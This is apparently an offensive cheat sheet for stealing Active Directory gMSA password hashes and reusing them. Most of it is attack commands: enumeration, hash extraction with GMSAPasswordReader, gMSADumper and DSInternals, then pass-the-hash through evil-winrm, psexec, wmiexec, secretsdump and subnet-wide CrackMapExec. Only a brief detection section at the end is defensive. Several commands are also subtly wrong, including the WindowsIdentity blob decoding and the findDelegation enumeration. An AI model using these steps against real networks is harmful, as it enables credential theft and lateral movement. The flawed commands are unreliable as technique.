# gMSA Abuse (Group Managed Service Accounts)

Group Managed Service Accounts (gMSAs) are a type of Active Directory account designed to automatically rotate their own passwords — no human sets or knows the password. The DC manages it and delivers it to authorized hosts on demand via the `msDS-ManagedPassword` attribute.

The attack surface: if you compromise an account or computer that is authorized to read a gMSA's password, you can extract the NT hash and use it for Pass-the-Hash or further attacks — even though no human ever knew the password.

---

## How gMSA Passwords Work

- The password is 256 bytes of random data, auto-rotated every 30 days
- Stored in the `msDS-ManagedPassword` attribute as a MSDS-MANAGEDPASSWORD_BLOB structure
- Only principals listed in `msDS-GroupMSAMembership` can read the attribute
- The NT hash can be derived from the blob and used directly for authentication

---

## Step 1 — Enumerate gMSA Accounts

### From Kali

```bash
# List all gMSA accounts in the domain
impacket-findDelegation <domain>/<username>:<password> -dc-ip <dc_ip>

# LDAP query for gMSA objects
ldapsearch -x -H ldap://<dc_ip> \
  -D "<username>@<domain>" \
  -w "<password>" \
  -b "DC=<domain>,DC=<tld>" \
  "(objectClass=msDS-GroupManagedServiceAccount)" \
  msDS-ManagedPassword msDS-GroupMSAMembership sAMAccountName
```

### From Windows — PowerShell

```powershell
# List all gMSA accounts
Get-ADServiceAccount -Filter {ObjectClass -eq "msDS-GroupManagedServiceAccount"} -Properties *

# Check who is authorized to read the password
Get-ADServiceAccount -Identity <gmsa_name> -Properties msDS-GroupMSAMembership |
  Select-Object -ExpandProperty msDS-GroupMSAMembership

# Check if you can read the managed password attribute
Get-ADServiceAccount -Identity <gmsa_name> -Properties msDS-ManagedPassword
```

### BloodHound

Look for the `ReadGMSAPassword` edge — it shows which principals can retrieve the gMSA password.

```
MATCH p=(u)-[:ReadGMSAPassword]->(g) RETURN p
```

---

## Step 2 — Verify You Have Read Access

Before attempting extraction, confirm your current account is in the authorized principals list:

```powershell
# Get the security descriptor of the gMSA password attribute
$gmsa = Get-ADServiceAccount -Identity <gmsa_name> -Properties msDS-GroupMSAMembership
$gmsa.'msDS-GroupMSAMembership'.Access
```

If your account or a group you belong to appears with `ReadProperty` rights on `msDS-ManagedPassword`, you can extract the password.

---

## Step 3 — Extract the gMSA Password Hash

### Method 1 — GMSAPasswordReader (Windows)

```powershell
# Download from: https://github.com/rvazarkar/GMSAPasswordReader
.\GMSAPasswordReader.exe --accountname <gmsa_name>

# The output returns an rc4_hmac value — this is the NT hash
# Note the $ suffix for service accounts when authenticating
```

Example output:
```
Calculating hashes for Old Value
[*] Input username             : svc_apache$
[*] Input domain               : domain.local
[*] Salt                       : DOMAIN.LOCALsvc_apache$
[*]       rc4_hmac             : 3A8B1C2D4E5F6789...
[*]       aes128_cts_hmac_sha1 : ...
[*]       aes256_cts_hmac_sha1 : ...
```

### Method 2 — gMSADumper (Kali)

```bash
# Install
pip3 install gMSADumper --break-system-packages

# Dump gMSA password hashes
python3 gMSADumper.py -u <username> -p <password> -d <domain> -l <dc_ip>

# Pass-the-Hash variant
python3 gMSADumper.py -u <username> -p <NT_hash> -d <domain> -l <dc_ip> --ntlm
```

### Method 3 — Native PowerShell (If AD Module Available)

```powershell
# Read the managed password blob
$gmsa = Get-ADServiceAccount -Identity <gmsa_name> -Properties msDS-ManagedPassword
$mp = $gmsa.'msDS-ManagedPassword'

# Decode the blob to extract the NT hash
$decoded = [System.Security.Principal.WindowsIdentity]::new($mp.Value)

# Alternative — use the DSInternals module
Import-Module DSInternals
$gmsa = Get-ADServiceAccount -Identity <gmsa_name> -Properties msDS-ManagedPassword
ConvertFrom-ManagedPasswordBlob $gmsa.'msDS-ManagedPassword'
```

### Method 4 — impacket (Remote)

```bash
# Using ldap3 / ntlmrelayx to capture gMSA blob
impacket-secretsdump <domain>/<username>:<password>@<dc_ip> -just-dc-user <gmsa_name>$
```

---

## Step 4 — Use the Extracted Hash

The `rc4_hmac` value from GMSAPasswordReader is an NT hash — use it exactly like any other NTLM hash.

```bash
# Evil-WinRM (note the $ in the username for service accounts)
evil-winrm -i <target_ip> -u '<gmsa_name>$' -H <NT_hash>

# CrackMapExec
crackmapexec smb <target> -u '<gmsa_name>$' -H <NT_hash>

# impacket-psexec
impacket-psexec '<domain>/<gmsa_name>$'@<target_ip> -hashes :<NT_hash>

# impacket-wmiexec
impacket-wmiexec '<domain>/<gmsa_name>$'@<target_ip> -hashes :<NT_hash>

# Secretsdump with gMSA hash
impacket-secretsdump '<domain>/<gmsa_name>$'@<dc_ip> -hashes :<NT_hash>
```

---

## Common Attack Path

A typical gMSA abuse chain looks like this:

```
Compromise low-priv user
    → User is member of group authorized to read gMSA password
    → Extract gMSA NT hash
    → gMSA account has local admin on target servers
    → Lateral movement / privilege escalation
```

Check what the gMSA account can access after extracting the hash:

```bash
# Check local admin access across the network
crackmapexec smb <subnet>/24 -u '<gmsa_name>$' -H <NT_hash>

# Check what SPNs the gMSA has (may allow Kerberoasting-style attacks)
Get-ADServiceAccount -Identity <gmsa_name> -Properties ServicePrincipalName
```

---

## Detection Notes

- Reads of `msDS-ManagedPassword` attribute are logged — Event ID 4662 with property GUID `{e362ed86-b728-0842-b27d-2dea7a9df218}`
- GMSAPasswordReader.exe execution on a host is a strong indicator
- Unexpected NTLM authentications using service account names ending in `$`
- BloodHound: audit `ReadGMSAPassword` edges regularly — any path from a compromised user to this edge is a priority finding